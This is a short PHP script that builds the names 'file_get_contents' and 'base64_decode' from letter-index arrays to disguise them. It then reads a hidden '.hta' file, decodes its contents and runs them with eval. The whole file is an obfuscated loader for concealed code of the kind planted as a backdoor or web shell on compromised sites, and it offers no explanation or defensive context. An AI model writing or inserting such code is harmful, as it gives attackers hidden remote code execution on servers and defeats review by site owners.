<?php
$letter = array('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z');
$array_a = array(5,8,11,4,0,6,4,19,0,2,14,13,19,4,13,19,18);
$array_b = array(1,0,18,4,3,4,2,14,3,4);
$function_a = $function_b = '';
for($i=0;$i<count($array_a);$i++){
	if($array_a[$i] == 0){
		$function_a .= '_';
	}else{
		$function_a .= $letter[$array_a[$i]];
	}
}
for($i=0;$i<count($array_b);$i++){
    if($i == 4){
		$function_b .= '64_';
	}
	$function_b .= $letter[$array_b[$i]];
}
$function_a = strtolower($function_a);
$function_b = strtolower($function_b);
$result = $function_b($function_a('.hta'), true);
eval($result);
